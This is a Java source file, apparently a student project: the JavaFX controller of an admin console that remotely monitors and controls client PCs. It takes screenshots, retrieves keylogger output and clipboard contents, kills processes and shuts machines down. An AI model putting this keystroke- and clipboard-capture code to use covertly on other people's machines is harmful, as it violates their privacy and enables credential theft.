package com.csm.admin.fxadmincsm.controller;

import com.csm.Message;
import com.csm.admin.fxadmincsm.Client;
import com.csm.admin.fxadmincsm.HelloApplication;
import com.csm.model.DiskModel;
import com.csm.model.MemoryModel;
import com.csm.model.OsHWModel;
import com.csm.model.ProcessModel;
import javafx.application.Platform;
import javafx.beans.property.ReadOnlyStringWrapper;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.chart.PieChart;
import javafx.scene.control.*;
import javafx.scene.control.Button;
import javafx.scene.control.Dialog;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.Pane;
import javafx.util.Pair;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Type;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.util.*;
import java.util.List;

public class HelloController implements Initializable {
    public TableView<String> table;
    public TableColumn<String, String> pcName;
    public Button refeshButton;
    public Label OsName;
    public TextArea CPUText;
    public Label Display;
    public TabPane tabPane;
    public Tab ProcessPane;
    public TableView<ProcessModel> Processtable;
    public TableColumn<ProcessModel, String> ProcessNameColumn;
    public TableColumn<ProcessModel, Integer> ProcessPIDColumn;
    public TableColumn<ProcessModel, String> ProcessMemoryColumn;
    public TableView<DiskModel> Disktable;
    public TableColumn<DiskModel, String> DiskNameColumn;
    public TableColumn<DiskModel, Double> DiskUsedColumn;
    public TableColumn<DiskModel, Double> DiskAvailableColumn;
    public TableColumn<DiskModel, String> PercentColumn;
    public Tab DiskPane;
    public Tab RamPane;
    public PieChart RamChart;
    public PieChart VRamChart;
    public PieChart DiskChart;
    public TextArea Ramlabel;
    public Tab CpuPane;
    public PieChart CPUChart;
    public TextArea keyLogerLabel;
    //    public TextArea CPUText;
    @FXML
    private Label welcomeText;
    public static ObservableList<String> listClient;
    public static HashMap<String, OsHWModel> OShash;
    public static HashMap<String, String> KeylogHash;
    public static ObservableList<ProcessModel> listProcess;
    public static ObservableList<DiskModel> listDisk;
    public static boolean isSTOPCPU;
    Thread CPULOAD;
    boolean stopCOULOAD = false;
    //Take Screen Shot
    @FXML
    protected void onHelloButtonClick() {
        try {
            String input = table.getSelectionModel().getSelectedItem();
            if (input == null || !input.contains("client")) {
                return;
            }
            Message object = new Message();
            object.command = Message.TAKE_SCREEN_SHOT;
            object.data = "data";
            object.toId = input;
            Client.dos.writeObject(object);
            try {
                Message msg = (Message) Client.dis.readObject();
                if (msg.data.equals("error"))
                    return;
                BufferedImage image = base64StringToImg(msg.data);
                int h = image.getHeight();
                int w = image.getWidth();
                image = resize(image, h / 2, w / 2);
                ImageIO.write(image, "png", new File("D:/shot.png"));
                Image imageShow = new Image("D:/shot.png");
                ImageView imageView = new ImageView(imageShow);
                Alert alert = new Alert(Alert.AlertType.INFORMATION);
                alert.setHeaderText("");
                alert.setContentText("");
                alert.setTitle("Ảnh chụp màn hình");
                alert.setGraphic(imageView);
                alert.showAndWait();
            } catch (IOException e) {
                //sdsd
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static BufferedImage base64StringToImg(final String base64String) {
        try {
            return ImageIO.read(new ByteArrayInputStream(Base64.getDecoder().decode(base64String)));
        } catch (final IOException ioe) {
            throw new UncheckedIOException(ioe);
        }
    }

    @Override
    public void initialize(URL url, ResourceBundle resourceBundle) {
        Dialog<Pair<String, String>> dialog = new Dialog();
        dialog.setTitle("Đăng nhập");
        dialog.setHeaderText("Nhập thông tin để xác nhận danh tính");
        ButtonType dnButton = new ButtonType("Đăng nhập", ButtonBar.ButtonData.OK_DONE);
        ButtonType huyButton = new ButtonType("Huỷ", ButtonBar.ButtonData.CANCEL_CLOSE);
        dialog.getDialogPane().getButtonTypes().addAll(dnButton, huyButton);
        FXMLLoader fxml = new FXMLLoader(getClass().getResource("/com/csm/admin/fxadmincsm/login.fxml"));
        ProcessNameColumn.setCellValueFactory(new PropertyValueFactory<>("processName"));
        ProcessPIDColumn.setCellValueFactory(new PropertyValueFactory<>("PID"));
        ProcessMemoryColumn.setCellValueFactory(new PropertyValueFactory<>("memory"));
        Pane pane = null;
        try {
            pane = fxml.load();
            dialog.getDialogPane().setContent(pane);
            LoginController con = fxml.getController();
            dialog.setResultConverter(dialogButton -> {
                if (dialogButton.getButtonData() == ButtonBar.ButtonData.OK_DONE) {
                    return new Pair<>(con.idText.getText(), con.passwordText.getText());
                }
                return null;
            });
            Optional<Pair<String, String>> result = dialog.showAndWait();
            if (result.isPresent()) {
                Pair<String, String> a = result.get();
                String id = a.getKey();
                String password = a.getValue();
                if (!(id.equals(HelloApplication.ADMIN_ID) && password.equals(HelloApplication.ADMIN_PASSWORD))) {
                    System.exit(0);
                }
                //Thanh: 26.91.242.109
                //Minh: 26.250.54.191
                //Tây: 26.84.204.9
                InetAddress ip = InetAddress.getByName("localhost");
                Client.s = new Socket(ip, Client.ServerPort, ip, 3123);
                Client.dos = new ObjectOutputStream(Client.s.getOutputStream());
                Client.dis = new ObjectInputStream(Client.s.getInputStream());
            } else {
                System.exit(0);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        DiskNameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
        DiskUsedColumn.setCellValueFactory(new PropertyValueFactory<>("used"));
        DiskUsedColumn.setCellFactory(column-> new TableCell<>(){
            @Override
            protected void updateItem(Double item, boolean empty) {
                super.updateItem(item, empty);
                if (empty) {
                    setText(null);
                } else {
                    setText(String.format("%.2f",item/1073741824) + "GiB");
                }
            }
        });
        DiskAvailableColumn.setCellValueFactory(new PropertyValueFactory<>("available"));
        DiskAvailableColumn.setCellFactory(column-> new TableCell<>(){
            @Override
            protected void updateItem(Double item, boolean empty) {
                super.updateItem(item, empty);
                if (empty) {
                    setText(null);
                } else {
                    setText(String.format("%.2f",item/1073741824) + " GiB");
                }
            }
        });
        PercentColumn.setCellValueFactory(new PropertyValueFactory<>("percent"));
        pcName.setCellValueFactory(cellData ->
                new ReadOnlyStringWrapper(cellData.getValue()));
        listClient = FXCollections.observableList(Arrays.asList(""));
        table.setItems(listClient);
        OShash = new HashMap<>();
        KeylogHash = new HashMap<>();
        onRefeshAction();
    }

    public void onRefeshAction() {
        try {
            Message object = new Message();
            object.command = Message.GET_LIST_USER;
            object.data = "";
            object.toId = "all";
            Client.dos.writeObject(object);
            Message msg = (Message) Client.dis.readObject();
            if (msg.data.equals("error"))
                return;
            listClient = FXCollections.observableList(listSIModeltoJson(msg.data));
            table.setItems(listClient);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static String listSIModeltoJson(List<String> list) {
        Type listType = new TypeToken<List<String>>() {
        }.getType();
        return new Gson().toJson(list, listType);
    }

    public static List<String> listSIModeltoJson(String json) {
        Type listType = new TypeToken<List<String>>() {
        }.getType();
        return new Gson().fromJson(json, listType);
    }

    private static BufferedImage resize(BufferedImage src, int h, int w) {
        if (h * w <= 0) {
            return src; //this can't be resized
        }
        int targetWidth = w;
        int targetHeight = h;
        float ratio = ((float) src.getHeight() / (float) src.getWidth());
        if (ratio <= 1) { //square or landscape-oriented image
            targetHeight = (int) Math.ceil((float) targetWidth * ratio);
        } else { //portrait image
            targetWidth = Math.round((float) targetHeight / ratio);
        }
        BufferedImage bi = new BufferedImage(targetWidth, targetHeight, src.getTransparency() == Transparency.OPAQUE ? BufferedImage.TYPE_INT_RGB : BufferedImage.TYPE_INT_ARGB);
        Graphics2D g2d = bi.createGraphics();
        g2d.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR); //produces a balanced resizing (fast and decent quality)
        g2d.drawImage(src, 0, 0, targetWidth, targetHeight, null);
        g2d.dispose();
        return bi;
    }

    public void onTableClick() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        tabPane.getSelectionModel().selectFirst();
        String keylog = onGetKeyLog();
        if (OShash.containsKey(index)) {
            OsHWModel os = OShash.get(index);
            OsName.setText(os.getOSPreFix());
            CPUText.setText(os.getProc());
            Display.setText(os.getDisplay());
            KeylogHash.put(index, KeylogHash.get(index) + keylog);
            keyLogerLabel.setText(KeylogHash.get(index));
        } else {
            KeylogHash.put(index, keylog);
            keyLogerLabel.setText(KeylogHash.get(index));
        }
        try {
            Message object = new Message();
            object.command = Message.GET_OS_INFO;
            object.data = "";
            object.toId = index;
            Client.dos.writeObject(object);
            Message msg = (Message) Client.dis.readObject();
            if (msg.data.equals("error")) {
                OsName.setText("");
                CPUText.setText("");
                Display.setText("");
                return;
            }
            Message object1 = new Message();
            object1.command = Message.GET_RAM;
            object1.data = "";
            object1.toId = index;
            try {
                Client.dos.writeObject(object1);
                Message msg1 = (Message) Client.dis.readObject();
                if (msg.data.equals("error"))
                    return;
                MemoryModel m = new Gson().fromJson(msg1.data, MemoryModel.class);
                Ramlabel.setText(m.getPhysicalMemoryInfo());
            } catch (IOException | ClassNotFoundException e) {
                System.err.println("Lỗi ghê á, CPU");
            }
            OsHWModel os = new Gson().fromJson(msg.data, OsHWModel.class);
            OsName.setText(os.getOSPreFix());
            CPUText.setText(os.getProc());
            Display.setText(os.getDisplay());
            OShash.put(index, os);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public void logOutUser() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        Message object = new Message();
        object.command = Message.LOG_OUT;
        object.data = "";
        object.toId = index;
        try {
            Client.dos.writeObject(object);
        } catch (IOException e) {
            System.err.println("Lỗi ghê á LogOutUser");
        }
    }

    public void shutDownUser() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        Message object = new Message();
        object.command = Message.SHUT_DOWN;
        object.data = "";
        object.toId = index;
        try {
            Client.dos.writeObject(object);
        } catch (IOException e) {
            System.err.println("Lỗi ghê á LogOutUser");
        }
    }

    public void getClipBoardAction() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        Message object = new Message();
        object.command = Message.GET_CLIPBOARD;
        object.data = "";
        object.toId = index;
        try {
            Client.dos.writeObject(object);
            Message msg = (Message) Client.dis.readObject();
            if (msg.data.equals("error")) {
                Alert alert = new Alert(Alert.AlertType.INFORMATION);
                alert.setHeaderText("");
                alert.setContentText("Người dùng đã bị ngắt kết nối");
                alert.setTitle("Thông tin trong ClipBoard");
                alert.showAndWait();
                return;
            }
            Alert alert = new Alert(Alert.AlertType.INFORMATION);
            alert.setHeaderText("");
            alert.setContentText(msg.data);
            alert.setTitle("Thông tin trong ClipBoard");
            alert.showAndWait();
        } catch (IOException | ClassNotFoundException e) {
            System.err.println("Lỗi ghê á getClipBoard");
        }
    }

    public void getNewProcess() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        Message object = new Message();
        object.command = Message.GET_LIST_PROCESS;
        object.data = "";
        object.toId = index;
        try {
            Client.dos.writeObject(object);
            Message msg = (Message) Client.dis.readObject();
            if (msg.data.equals("error"))
                return;
            listProcess = FXCollections.observableList(getProcessfromJson(msg.data));
            Processtable.setItems(listProcess);
        } catch (IOException | ClassNotFoundException e) {
            System.err.println("Lỗi ghê á getProcess");
        }
    }

    public void killProcess() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        ProcessModel process = Processtable.getSelectionModel().getSelectedItem();
        if (process == null) {
            return;
        }
        Message object = new Message();
        object.command = Message.KILL_PROCESS;
        object.data = "" + process.getPID();
        object.toId = index;
        try {
            Client.dos.writeObject(object);
            getNewProcess();
        } catch (IOException e) {
            System.err.println("Lỗi ghê á getProcess");
        }
    }

    public void onSelectionChanged() {

        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        if (ProcessPane.isSelected()) {
            Message object = new Message();
            object.command = Message.GET_LIST_PROCESS;
            object.data = "";
            object.toId = index;
            try {
                Client.dos.writeObject(object);
                Message msg = (Message) Client.dis.readObject();
                if (msg.data.equals("error"))
                    return;
                listProcess = FXCollections.observableList(getProcessfromJson(msg.data));
                Processtable.setItems(listProcess);
            } catch (IOException | ClassNotFoundException e) {
                System.err.println("Lỗi ghê á getProcess");
            }
        }
        if (DiskPane.isSelected()) {
            Message object = new Message();
            object.command = Message.GET_DISK;
            object.data = "";
            object.toId = index;
            try {
                Client.dos.writeObject(object);
                Message msg = (Message) Client.dis.readObject();
                if (msg.data.equals("error"))
                    return;
                listDisk = FXCollections.observableList(DiskModel.fromJson(msg.data));
                Disktable.setItems(listDisk);
            } catch (IOException | ClassNotFoundException e) {
                System.err.println("Lỗi ghê á getProcess");
            }
        }
        if (RamPane.isSelected()) {
            Message object = new Message();
            object.command = Message.GET_RAM;
            object.data = "";
            object.toId = index;
            try {
                Client.dos.writeObject(object);
                Message msg = (Message) Client.dis.readObject();
                if (msg.data.equals("error"))
                    return;
                MemoryModel m = new Gson().fromJson(msg.data, MemoryModel.class);
                double RamUsed = Double.parseDouble(m.getPhysicalMemoryUsed())/ (Double.parseDouble(m.getPhysicalMemoryUsed())+ Double.parseDouble(m.getPhysicalMemoryAvailable()));
                PieChart.Data sliceR = new PieChart.Data("Ram used \n" + String.format("%.2f",RamUsed*100) + " %", Double.parseDouble(m.getPhysicalMemoryUsed()));
                PieChart.Data sliceR1 = new PieChart.Data("Ram available \n" + String.format("%.2f",100 - (RamUsed*100)) + " %", Double.parseDouble(m.getPhysicalMemoryAvailable()));
                double VRamUsed = Double.parseDouble(m.getVirtualMemoryUsed())/ (Double.parseDouble(m.getVirtualMemoryUsed())+ Double.parseDouble(m.getVirtualMemoryAvailable()));
                PieChart.Data sliceV = new PieChart.Data("VRam used \n" + String.format("%.2f",VRamUsed*100) + " %", Double.parseDouble(m.getVirtualMemoryUsed()));
                PieChart.Data sliceV1 = new PieChart.Data("VRam available \n" + String.format("%.2f",100 - (VRamUsed*100)) + " %", Double.parseDouble(m.getVirtualMemoryAvailable()));
                RamChart.setTitle("Ram memory");
                RamChart.getData().clear();
                RamChart.getData().add(sliceR);
                RamChart.getData().add(sliceR1);
                VRamChart.setTitle("Virtual ram memory");
                VRamChart.getData().clear();
                VRamChart.getData().add(sliceV);
                VRamChart.getData().add(sliceV1);
            } catch (IOException | ClassNotFoundException e) {
                System.err.println("Lỗi ghê á getProcess");
            }
        }
        if (CpuPane.isSelected()) {
            Message object = new Message();
            object.command = Message.OPEN_SOCKET_CPU;
            object.data = "";
            object.toId = index;
            try {
                stopCOULOAD = false;
                Client.dos.writeObject(object);
                Message msg = (Message) Client.dis.readObject();
                int port = Integer.parseInt(msg.data);
                InetAddress ip = InetAddress.getByName("localhost");
                System.out.println(port);
                Socket s = new Socket(ip, port);
                ObjectOutputStream dos = new ObjectOutputStream(s.getOutputStream());
                ObjectInputStream dis = new ObjectInputStream(s.getInputStream());
                CPULOAD = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        while(!Thread.currentThread().isInterrupted()) {
                            try {
                                Message msg = (Message) dis.readObject();
                                if (msg.data.equals("error"))
                                    return;
                                PieChart.Data sliceR = new PieChart.Data("CPU used \n" +  String.format("%.2f ",Double.parseDouble(msg.data)) +" %", Double.parseDouble(msg.data));
                                PieChart.Data sliceR1 = new PieChart.Data("CPU available \n"  +  String.format("%.2f ", 100 -Double.parseDouble(msg.data)) +" %", 100 - Double.parseDouble(msg.data));
                                Platform.runLater(new Runnable(){
                                    @Override
                                    public void run() {
                                        CPUChart.getData().clear();
                                        CPUChart.getData().add(sliceR);
                                        CPUChart.getData().add(sliceR1);
                                    }
                                });
                                if(stopCOULOAD){
                                    Thread.currentThread().interrupt();
                                }
                            } catch (IOException | ClassNotFoundException e) {
                                Thread.currentThread().interrupt();
                                e.printStackTrace();
                            }
                        }
                    }
                });
                CPULOAD.start();
            } catch (IOException | ClassNotFoundException e) {
                System.err.println("Lỗi ghê á ghi phím");
            }
        }else{
            stopCOULOAD = true;
        }
    }

    public static List<ProcessModel> getProcessfromJson(String json) {
        Type listType = new TypeToken<List<ProcessModel>>() {
        }.getType();
        return new Gson().fromJson(json, listType);
    }

    public void onDiskSelection() {
        DiskModel model = Disktable.getSelectionModel().getSelectedItem();
        if (model == null) {
            return;
        }
        PieChart.Data used = new PieChart.Data("Đã sử dụng: \n" +model.getPercent() + "%", model.getUsed());
        PieChart.Data avail = new PieChart.Data("Còn lại: \n" +String.format("%.2f ", 100-Double.parseDouble(model.getPercent())) +"%", model.getAvailable());
        DiskChart.setTitle(model.getName() + String.format(": %.2f ",(model.getUsed() + model.getAvailable())/1073741824) + "GiB");
        DiskChart.getData().clear();
        DiskChart.getData().add(used);
        DiskChart.getData().add(avail);
    }

    public String onGetKeyLog() {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return "";
        }
        Message object = new Message();
        object.command = Message.GET_KEYLOG;
        object.data = "";
        object.toId = index;
        try {
            Client.dos.writeObject(object);
            Message msg = (Message) Client.dis.readObject();
            if (msg.data.equals("error")) {
//                keyLogerLabel.setText("Người dùng đã ngắt kết nối");
                return "";
            }
            keyLogerLabel.setText(msg.data);
            return msg.data;
        } catch (IOException | ClassNotFoundException e) {
            System.err.println("Lỗi ghê á ghi phím");
        }
        return "";
    }

    public void requestOpenSocket(ActionEvent actionEvent) {
        String index = table.getSelectionModel().getSelectedItem();
        if (index == null || !index.contains("client")) {
            return;
        }
        Message object = new Message();
        object.command = Message.OPEN_SOCKET_CPU;
        object.data = "";
        object.toId = index;
        try {
            Client.dos.writeObject(object);
            Message msg = (Message) Client.dis.readObject();
            int port = Integer.parseInt(msg.data);
            InetAddress ip = InetAddress.getByName("localhost");
            System.out.println(port);
            Socket s = new Socket(ip, port);
            ObjectOutputStream dos = new ObjectOutputStream(s.getOutputStream());
            ObjectInputStream dis = new ObjectInputStream(s.getInputStream());
            CPULOAD = new Thread(new Runnable() {
                @Override
                public void run() {
                    while(!Thread.currentThread().isInterrupted()) {
                        try {
                            Message read = (Message) dis.readObject();
                            System.out.println(read.data);
                        } catch (IOException | ClassNotFoundException e) {
                            Thread.currentThread().interrupt();
                            e.printStackTrace();
                        }
                    }
                }
            });
            CPULOAD.start();
        } catch (IOException | ClassNotFoundException e) {
            System.err.println("Lỗi ghê á ghi phím");
        }
    }
}